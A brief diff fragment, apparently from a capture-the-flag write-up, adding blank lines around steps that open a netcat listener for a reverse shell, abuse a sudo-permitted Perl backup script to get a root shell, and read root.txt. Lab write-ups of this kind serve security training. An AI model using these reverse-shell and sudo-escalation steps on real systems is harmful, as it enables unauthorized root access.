@@ -109,5 +109,7 @@ nc -lvnp 4445
 sudo usr/bin/perl /home/itguy/backup.pl
 
 We now have a shell as root.
+
 cd ~/
+
 cat root.txt
